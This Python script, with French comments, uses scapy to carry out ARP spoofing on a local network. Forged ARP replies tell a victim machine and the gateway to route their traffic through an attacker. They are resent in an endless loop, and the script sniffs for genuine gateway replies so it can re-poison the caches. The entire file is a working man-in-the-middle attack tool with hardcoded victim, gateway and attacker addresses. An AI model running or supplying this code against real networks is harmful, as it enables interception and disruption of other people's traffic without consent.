#!/usr/bin/python
# coding: utf-8

from scapy.all import *

def main():
	#Solution provisoire en attendant 
	#Apres on prendre les donnees de l'utilisateur
	attaquantIP="192.168.0.106"
	attaquantMAC="64:76:BA:9E:67:26"
	victimeIP="192.168.0.100"
	victimeMAC="24:0A:64:63:BF:65"
	gatewayIP="192.168.0.1"
	gatewayMAC="AC:F1:DF:64:30:FC"
	couperVictime(victimeIP, victimeMAC, gatewayIP, gatewayMAC)


def couperVictime(victimeIP, victimeMAC, gatewayIP, gatewayMAC):
	#Creation du faux paquet pour envoyer a la victime
	fauxARP = ARP()
	fauxARP.op = 2
	fauxARP.psrc = gatewayIP
	fauxARP.pdst = victimeIP
	fauxARP.hwdst = victimeMAC

	fauxARPGW = ARP()
	fauxARPGW.op=2
	fauxARPGW.psrc=victimeIP
	fauxARPGW.pdst=gatewayIP
	fauxARPGW.hwdst=gatewayMAC

	#On envoie toujours le faux ARP quand le cache n'est pas usurpe
	while True:

	 #On envoie le faux ARP
	 send(fauxARP)
	 send(fauxARPGW)

	 #Apres un moment, le gateway par defaut envoie un ARP pour donner son adresse MAC
	 #La victime n'est plus trompee et la communication ne passe plus par l'attaquant
	 #Pour empecher cela, on sniff la commnucation entre la gateway et la victime 
	 #Des que la gateway envoie une reponse ARP, l'attaquant usurpe la victime
	 sniff(filter="arp and host 192.168.0.1 or host 192.168.0.100", count=1)

main()